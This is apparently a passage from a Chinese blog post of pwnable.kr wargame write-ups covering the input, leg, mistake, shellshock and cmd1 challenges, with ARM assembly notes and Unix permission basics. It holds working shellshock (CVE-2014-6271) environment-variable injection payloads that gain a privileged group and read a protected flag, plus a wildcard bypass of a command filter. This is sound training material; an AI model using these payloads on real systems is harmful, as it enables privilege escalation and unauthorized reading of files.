+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import socket</span><br><span class="line">import time</span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line">stdinr, stdinw = os.pipe()</span><br><span class="line">stderrr, stderrw = os.pipe()</span><br><span class="line"></span><br><span class="line">args = list(&quot;A&quot;*99)</span><br><span class="line">args[ord(&apos;A&apos;) - 1] = &quot;&quot;</span><br><span class="line">args[ord(&apos;B&apos;) - 1] = &quot;\x20\x0a\x0d&quot;</span><br><span class="line">args[ord(&quot;C&quot;) - 1] = &quot;8888&quot;</span><br><span class="line"></span><br><span class="line">os.write(stdinw, &quot;\x00\x0a\x00\xff&quot;)</span><br><span class="line">os.write(stderrw, &quot;\x00\x0a\x02\xff&quot;)</span><br><span class="line"></span><br><span class="line">environ = &#123;&quot;\xde\xad\xbe\xef&quot; : &quot;\xca\xfe\xba\xbe&quot;&#125;</span><br><span class="line"></span><br><span class="line">f = open(&quot;\x0a&quot; , &quot;wb&quot;)</span><br><span class="line">f.write(&quot;\x00&quot;*4)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">pro = subprocess.Popen([&quot;/home/input2/input&quot;]+args, stdin=stdinr,stderr=stderrr,env=environ)</span><br><span class="line"></span><br><span class="line">time.sleep(2)</span><br><span class="line">s.connect((&quot;127.0.0.1&quot;, 8888))</span><br><span class="line">s.send(&quot;\xde\xad\xbe\xef&quot;)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
+
+<p>解题wp:<br>1 <a href="https://www.jianshu.com/p/032a754b72d8" target="_blank" rel="noopener">https://www.jianshu.com/p/032a754b72d8</a><br>2 <a href="https://blog.csdn.net/SmalOSnail/article/details/53048109" target="_blank" rel="noopener">https://blog.csdn.net/SmalOSnail/article/details/53048109</a></p>
+<p>知识储备:</p>
+<ul>
+<li>PC代表程序计数器，流水线使用三个阶段，因此指令分为三个阶段执行：1.取指（从存储器装载一条指令）；2.译码（识别将要被执行的指令）；3.执行（处理指令并将结果写回寄存器）。而R15（PC）总是指向“正在取指”的指令，而不是指向“正在执行”的指令或正在“译码”的指令。一般来说，人们习惯性约定将“正在执行的指令作为参考点”，称之为当前第一条指令，因此PC总是指向第三条指令。当ARM状态时，每条指令为4字节长，所以PC始终指向该指令地址加8字节的地址，即：PC值=当前程序执行位置+8；<br>ARM指令是三级流水线，取指，译指，执行时同时执行的，现在PC指向的是正在取指的地址，那么cpu正在译指的指令地址是PC-4（假设在ARM状态下，一个指令占4个字节），cpu正在执行的指令地址是PC-8，也就是说PC所指向的地址和现在所执行的指令地址相差8。</li>
+<li>arm与thumb间的切换<br>1、由arm状态切换到thumb<br>  状态将寄存器的最低位设置为1<br>  BX指令：R0[0]=1，则执行BX<br>  R0指令将进入thumb状态<br>2、由thumb状态切换到ARM状态<br>  寄存器最低位设置为0<br>  BX指令：R0[0]=0，则执行BX<br>  R0指令将进入arm状态</li>
+<li>lr寄存器中存储的是子函数的返回地址，那么应该在main()函数的反汇编代码中找key3()函数返回后下一条指令地址：</li>
+</ul>
+<h1 id="8-leg"><a href="#8-leg" class="headerlink" title="8-leg"></a>8-leg</h1><p>题目中给了源码和反汇编过后的代码<br><img src="/2019/11/21/pwnable-kr/aizlm/Desktop/aizlm_blog/source/_posts/8-1.png" alt=" "></p>
+<blockquote>
+<p>看代码 只要使得key1()+key2()+key3 == key 就可以得到flag</p>
+</blockquote>
+<p><img src="/2019/11/21/pwnable-kr/aizlm/Desktop/aizlm_blog/source/_posts/8-2.png" alt=" "><br><img src="/2019/11/21/pwnable-kr/aizlm/Desktop/aizlm_blog/source/_posts/8-3.png" alt=" "><br>首先对于key1() 代码中<br>   0x00008cdc &lt;+8&gt;:        mov    r3, pc<br>   0x00008ce0 &lt;+12&gt;:    mov    r0, r3<br>pc值传给r3 后传给r0 由上面补充的知识可以知道,pc应是当前程序执行位置+8 即r0=0x00008cdc+0x8=0x00008ce4</p>
+<p>对于key2() 代码中<br>   0x00008cfc &lt;+12&gt;:    add    r6, pc, #1<br>   0x00008d00 &lt;+16&gt;:    bx    r6<br>   0x00008d04 &lt;+20&gt;:    mov    r3, pc<br>   0x00008d06 &lt;+22&gt;:    adds    r3, #4<br>   0x00008d08 &lt;+24&gt;:    push    {r3}<br>   0x00008d0a &lt;+26&gt;:    pop    {pc}<br>   0x00008d0c &lt;+28&gt;:    pop    {r6}        ; (ldr r6, [sp], #4)<br>   0x00008d10 &lt;+32&gt;:    mov    r0, r3<br>对第一行 r6=pc的地址+8+1=0x00008cfc+0x8+0x1<br>对第二行 bx指令 这条指令表示r6是跳转的目的地址，并且根据地址的最低位确定是否状态切换 为1时 进入thumb状态 为0时 进入arm状态 进入thumb状态时 pc指向当前程序执行位置+4<br>对第三行 r3=0x00008d04+0x4<br>对第四行 r3=r3+0x4<br>对第五行 将r3压入栈中<br>对第六、七行 将pc、r6弹出栈<br>对第八行 将r3的值传给r0<br>所以r0=r3=0x00008d04+0x4+0x4=0x00008d0c</p>
+<p>对于key3() 代码中<br>   0x00008d28 &lt;+8&gt;:        mov    r3, lr<br>   0x00008d2c &lt;+12&gt;:    mov    r0, r3<br>lr寄存器存储的是子函数的返回地址,所以应在main函数的反汇编代码中查找key3()函数返回后的下一条指令地址 代码:<br>   0x00008d78 &lt;+60&gt;:    add    r4, r4, r3<br>   0x00008d7c &lt;+64&gt;:    bl    0x8d20 <key3><br>   0x00008d80 &lt;+68&gt;:    mov    r3, r0<br>所以key3()函数的返回值就是0x00008d80</key3></p>
+<p>则key1()+key2()+key3()=0x0001a774 由于是%d 要输入十进制数 则转化成108400 运行leg文件 得到flag<br><img src="/2019/11/21/pwnable-kr/8-4.png" alt=" "></p>
+<blockquote>
+<p>We all make mistakes, let’s move on.<br>(don’t take this too seriously, no fancy hacking skill is required at all)<br>This task is based on real event<br>Thanks to dhmonkey<br>hint : operator priority<br>ssh <a href="mailto:mistake@pwnable.kr" target="_blank" rel="noopener">mistake@pwnable.kr</a> -p2222 (pw:guest)<br>题目所给:提示了hint : operator priority 运算符优先级</p>
+</blockquote>
+<h1 id="9-mistake"><a href="#9-mistake" class="headerlink" title="9-mistake"></a>9-mistake</h1><blockquote>
+<p>链接服务器 获取源码<br><img src="/2019/11/21/pwnable-kr/aizlm/Desktop/aizlm_blog/source/_posts/9-1.png" alt=" "></p>
+<blockquote>
+<p>我拿到题首先看到的是xor异或函数 根据第六题 可能我们会自己编程一个程序去获得buf_1的值 然后就可以通过比较相同的原理和异或运算去获得buf_2的值 然后发现buf_1的值是要从服务器中的password的文件中获取的以0400起前10位 然后就尬住了</p>
+<blockquote>
+<p>就上网查<br>说if(fd=open(“/home/mistake/password”,O_RDONLY,0400) &lt; 0)这一句中的”&lt;”优先级是大于”=”的 那就说明open函数&lt;0 很明显open函数返回值不会为负数 所以fd=false=0 则在下面的read函数中我们可以用键盘进行标准输入<br>又因为xor会将我们输入的buf_2给异或掉 所以我们只需要输入一对10位的互相异或的值就行了 这里随便取1、0的十位组合即可</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<p>运行mistake文件 输入值 得到flag<br><img src="/2019/11/21/pwnable-kr/9-2.png" alt=" "></p>
+<p>补充知识:</p>
+<blockquote>
+<p>UNIX下可以用ls -l 命令来看到文件的权限。用ls命令所得到的表示法的格式是类似这样的：-rwxr-xr-x 。下面解析一下格式所表示的意思。这种表示方法一共有十位：<br>9 8 7 6 5 4 3 2 1 0 </p>
+</blockquote>
+<ul>
+<li>r w x r - x r - x<br>第9位表示文件类型,可以为p、d、l、s、c、b和-：<br>p表示命名管道文件<br>d表示目录文件<br>l表示符号连接文件<br>-表示普通文件<br>s表示socket文件<br>c表示字符设备文件<br>b表示块设备文件<br>第8-6位、5-3位、2-0位分别表示文件所有者的权限，同组用户的权限，其他用户的权限，其形式为rwx：<br>r表示可读，可以读出文件的内容<br>w表示可写，可以修改文件的内容<br>x表示可执行，可运行这个程序<br>没有权限的位置用-表示</li>
+</ul>
+<blockquote>
+<blockquote>
+<p>-rwsr-xr-x的值为： 1 0 0 1 1 1 1 0 1 1 0 1<br>-rw-r-Sr–的值为： 0 1 0 1 1 0 1 0 0 1 0 0<br>姿势来源:<a href="https://blog.csdn.net/findstr/article/details/7330592" target="_blank" rel="noopener">https://blog.csdn.net/findstr/article/details/7330592</a><br>shellshock漏洞原理:<br>1 环境变量的值以()开头表示定义导入函数。在bash启动时，如果存在导入函数，那么这个函数就会被执行。<br>2 调用子进程bash时候，会copy父进程的env，执行导入函数时，bash解析环境变量没有对代码和数据进行边界识别，导致任意代码执行，也就是echo vulnerable。<br>payload:env x=’() { :;}; echo vulnerable’ bash -c “echo this is a test”</p>
+</blockquote>
+</blockquote>
+<h1 id="shellshock-pwnable-kr"><a href="#shellshock-pwnable-kr" class="headerlink" title="shellshock pwnable.kr"></a>shellshock pwnable.kr</h1><blockquote>
+<p>ssh <a href="mailto:shellshock@pwnable.kr" target="_blank" rel="noopener">shellshock@pwnable.kr</a> -p2222<br>pw:guest</p>
+</blockquote>
+<p>源码:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">	setresuid(getegid(), getegid(), getegid());</span><br><span class="line">	setresgid(getegid(), getegid(), getegid());</span><br><span class="line">	system(&quot;/home/shellshock/bash -c &apos;echo shock_me&apos;&quot;);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>查看权限和我现在处于的用户是什么:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">shellshock@ubuntu:~$ ls -al</span><br><span class="line">total 980</span><br><span class="line">drwxr-x---  5 root shellshock       4096 Oct 23  2016 .</span><br><span class="line">drwxr-xr-x 93 root root             4096 Oct 10  2018 ..</span><br><span class="line">-r-xr-xr-x  1 root shellshock     959120 Oct 12  2014 bash</span><br><span class="line">d---------  2 root root             4096 Oct 12  2014 .bash_history</span><br><span class="line">-r--r-----  1 root shellshock_pwn     47 Oct 12  2014 flag</span><br><span class="line">dr-xr-xr-x  2 root root             4096 Oct 12  2014 .irssi</span><br><span class="line">drwxr-xr-x  2 root root             4096 Oct 23  2016 .pwntools-cache</span><br><span class="line">-r-xr-sr-x  1 root shellshock_pwn   8547 Oct 12  2014 shellshock</span><br><span class="line">-r--r--r--  1 root root              188 Oct 12  2014 shellshock.c</span><br><span class="line"></span><br><span class="line">shellshock@ubuntu:~$ whoami</span><br><span class="line">shellshock</span><br></pre></td></tr></table></figure>
+
+<p>这里我们的用户id是shellshock 而目标文件flag是shellshock_pwn 而在flag前面的权限中 -r–r—–说明所在组是有可读权限的</p>
+<blockquote>
+<p>日常看保护机制,检查shellshock漏洞:</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">shellshock@ubuntu:~$ checksec shellshock</span><br><span class="line">[*] &apos;/home/shellshock/shellshock&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE</span><br><span class="line">shellshock@ubuntu:~$ env x=&apos;() &#123; :;&#125;; echo vulnerable&apos; bash -c &quot;echo whatever&quot; whatever</span><br><span class="line">whatever</span><br><span class="line">shellshock@ubuntu:~$ env x=&apos;() &#123; :;&#125;; echo vulnerable&apos; ./bash -c &quot;echo whatever&quot;</span><br><span class="line">vulnerable</span><br><span class="line">whatever</span><br></pre></td></tr></table></figure>
+
+<p>这里输入’bash’时,没有触发shellshock漏洞;而’./bash’触发了。网上说该服务器没有这个漏洞,而是当前目录下的这个vulnerable的’bash’是供我们练习用的<br>很重要的一点:观察一下shellshock.c的源码，发现它把自己的ruid，euid，suid和rgid，egid，sgid都改成了egid，即shellshock_pwn这个组的effective id。这样它就有权限去读取flag文件了。</p>
+<ul>
+<li>解法:</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">shellshock@ubuntu:~$ id</span><br><span class="line">uid=1019(shellshock) gid=1019(shellshock) groups=1019(shellshock)</span><br><span class="line">shellshock@ubuntu:~$ env x=&apos;() &#123; :;&#125;; bash&apos; ./shellshock</span><br><span class="line">shellshock@ubuntu:~$ id</span><br><span class="line">uid=1019(shellshock) gid=1020(shellshock_pwn) groups=1020(shellshock_pwn),1019(shellshock)</span><br><span class="line">shellshock@ubuntu:~$ cat flag</span><br><span class="line">only if I knew CVE-2014-6271 ten years ago..!!</span><br><span class="line">shellshock@ubuntu:~$ env x=&apos;() &#123; :;&#125;; ./bash -c &quot;cat ./flag&quot;&apos; ./shellshock</span><br><span class="line">only if I knew CVE-2014-6271 ten years ago..!!</span><br><span class="line">Segmentation fault(出现段错误)</span><br><span class="line">shellshock@ubuntu:~$ env echo=&quot;() &#123; cat flag;&#125;&quot; /home/shellshock/bash -c &apos;/home/shellshock/shellshock&apos;</span><br><span class="line">only if I knew CVE-2014-6271 ten years ago..!!</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>知识补充:putenv()函数是改变环境变量的,所以更改了环境变量后,惯用的ls,cat等命令不能直接使用,但我们通过完整的路径来使用 *:/bin/cat;(实现cat功能)</p>
+</blockquote>
+<h1 id="14-cmd1-pwnable-kr"><a href="#14-cmd1-pwnable-kr" class="headerlink" title="14-cmd1 pwnable.kr"></a>14-cmd1 pwnable.kr</h1><p>首先还是链接服务器 获得源码<br>ssh <a href="mailto:cmd1@pwnable.kr" target="_blank" rel="noopener">cmd1@pwnable.kr</a> -p2222 pw:guest</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int filter(char* cmd)&#123;</span><br><span class="line">	int r=0;</span><br><span class="line">	r += strstr(cmd, &quot;flag&quot;)!=0;</span><br><span class="line">	r += strstr(cmd, &quot;sh&quot;)!=0;</span><br><span class="line">	r += strstr(cmd, &quot;tmp&quot;)!=0;</span><br><span class="line">	return r;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char* argv[], char** envp)&#123;</span><br><span class="line">	putenv(&quot;PATH=/thankyouverymuch&quot;);</span><br><span class="line">	if(filter(argv[1])) return 0;</span><br><span class="line">	system( argv[1] );</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里main函数中定义了三个变量 其中第三个参数定义有关环境变量的envp 在函数中putenv正好是改变环境变量的 所以需要利用完整的路径去实现不能用的cat功能</p>
+<ul>
+<li>strstr(str1,str2)函数用于判断字符串str2是否是str1的子串 如果是,则该函数返回str2在str1中首次出现的地址;否则,返回NULL</li>
+</ul>
+<p>在另外一个函数中filter中定义的是main函数中的第二个变量argv[]<br>函数中写了它不能是flag sh tmp 所以也就是实现了过滤了这三个参数<br>所以直接输入./cmd1 “/bin/cat /home/cmd1/flag”是不可以的 要拿通配符替换掉后面第二个参数”/home/cmd1/flag”</p>
+<ul>
+<li>这里还有知识补充:在linux操作系统中 有通配符的概念 通配符的作用有很多 这里用到的是代表任意字符(不限个数)的* 和代表一个字符的?</li>
+</ul>
+<p>所以这里应该输入:<br>./cmd1 “/bin/cat *”或者./cmd1 “/bin/cat /home/cmd1/f*”或者./cmd1 “/bin/cat /home/cmd1/fla?”(这里改成f***都是可以的)<br><img src="/2019/11/21/pwnable-kr/aizlm/Desktop/aizlm_blog/source/_posts/14-1.png" alt=" "></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">常见的通配符:</span><br><span class="line">* - 通配符,代表任意字符(0到多个)</span><br><span class="line">? - 通配符,代表一个字符</span><br><span class="line"># - 注释</span><br><span class="line">/ - 跳转符号,将特殊字符或通配符还原成一般符号</span><br><span class="line">| - 分隔两个管线命令的界定</span><br><span class="line">; - 连续性命令的界定</span><br><span class="line">~ - 用户的根目录</span><br><span class="line">$ - 变量前需要加的变量值</span><br><span class="line">! - 逻辑运算中的&quot;非&quot;(not)</span><br><span class="line">/ - 路径分隔符号</span><br><span class="line">&gt;, &gt;&gt; - 输出导向,分别为&quot;取代&quot;与&quot;累加&quot;</span><br><span class="line">&apos; - 单引号,不具有变量置换功能</span><br><span class="line">&quot; - 双引号,具有变量置换功能</span><br><span class="line">` - quote符号,两个``中间为可以先执行的指令</span><br><span class="line">() - 中间为子shell的起始与结束</span><br><span class="line">[] - 中间为字符组合</span><br><span class="line">&#123;&#125; - 中间为命令区块组合</span><br><span class="line">Ctrl+C - 终止当前命令</span><br><span class="line">Ctrl+D - 输入结束(EOF),例如邮件结束的时候</span><br><span class="line">Ctrl+M - 就是Enter</span><br><span class="line">Ctrl+S - 暂停屏幕的输出</span><br><span class="line">Ctrl+Q - 恢复屏幕的输出</span><br><span class="line">Ctrl+U - 在提示符下,将整行命令删除</span><br><span class="line">Ctrl+Z - 暂停当前命令</span><br><span class="line">&amp;&amp; - 当前一个指令执行成功时,执行后一个指令</span><br><span class="line">|| - 当前一个指令执行失败时,执行后一个指令</span><br><span class="line">其中最常用的是＊、？、［］和 ‘。下面举几个简单的例子：</span><br><span class="line">1，ls test*             &lt;== *表示后面不论接几个字符都接受（没有字符也接受）</span><br><span class="line">2，ls test?            &lt;== ?表示后面当且仅当接一个字符时才接受</span><br><span class="line">3，ls test???       &lt;== ???表示一定要接三个字符</span><br><span class="line">4，cp  test[1~5]  /tmp      &lt;== test1, test2, test3, test4, test5若存在，则复制到/tmp目录下</span><br><span class="line">5，cd  /lib/modules/&apos; uname  -r&apos;/kernel/drivers        &lt;== 被 &apos; &apos; 括起来的命令先执行</span><br></pre></td></tr></table></figure>
+
+
+      </div>
+    </div>
+  </div>
+</div>
+<div class="lx-navigation">
+	<div class="lx-cover prev lx-cover-sm" style="background-image: url(/images/footer_1.jpg)">
+		<div class="overlay"></div>
+		<a class="copy" href="/2019/11/21/JavaBasic/">
+			<div class="display-t">
+				<div class="display-tc">
+					<div>
+						<span>Next</span>
+						<h3>JavaBasic</h3>
+					</div>
+				</div>
+			</div>
+		</a>
+	</div>
+        <div class="lx-cover next lx-cover-sm" style="background-image: url(/images/footer_2.jpg)">
+		<div class="overlay"></div>
+		<a class="copy" href="/2019/10/26/UNCTF/">
+			<div class="display-t">
+				<div class="display-tc">
+					<div>
+						<span>Prev</span>
+						<h3>UNCTF</h3>
+					</div>
+				</div>
+			</div>
+		</a>
+	</div>
+</div>
+</div>
+
+<footer>
+  <div>
+  Copyright &copy; 2019.<a href="/">Aizlm_blog</a><br>Powered by <a href="https://hexo.io" target="_blank">Hexo</a> | Theme <a href="https://lx.blleng.cn" target="_blank">Lx</a><br>
+  </div>
+</footer>
+</div>
+
+<button class="menu-trigger"></button>
+<div class="menu">
+  <div class="menu-head">
+    <span class="layer">
+      <div class="col">
+        <div class="row for-pic">
+          <div class="profile-pic">
+            <a href="/"><img src="/images/ava-1.png" alt="aizlm_Lin"></a>
+          </div>
+        </div>
+        <div class="row for-name">
+          <p>aizlm_Lin</p>
+          <span class="tagline">不爱学习的小胖子</span>
+        </div>
+      </div>
+    </span>
+  </div>
+  <nav class="menu-container">
+  <ul class="menu-items">
+    <li><a href="/"><i class="fa fa-home fa-fw"></i>首页</a></li>
+    <li><a href="/archives/"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+    <li class="has-sub"><span class="dropdown-heading">
+      <i class="fa fa-bookmark fa-fw"></i>页面</span>
+        <ul>
+          <li><a href="/guestbook">留言</a></li>
+        <li><a href="/about">关于</a></li>
+        </ul>
+    </li>
+    <li class="has-sub"><span class="dropdown-heading">
+      <i class="fa fa-link fa-fw"></i>友链</span>
+        <ul>
+          <li> <a href="https://lx.blleng.cn" target="_blank">Theme-Lx</a></li>
+        </ul>
+    </li>
+  </ul>
+  </nav>
+</div>
+
+<div class="gototop js-top">
+  <a href="#" class="js-gotop"><i class="fa fa-arrow-up"></i></a>
+</div>
+<script src="/js/jquery.easing.min.js"></script>
+<script src="/js/jquery.waypoints.min.js"></script>
+<script src="/js/jquery.stellar.min.js"></script>
+<script src="/js/main.js"></script>
+
+
+</body>
+</html>
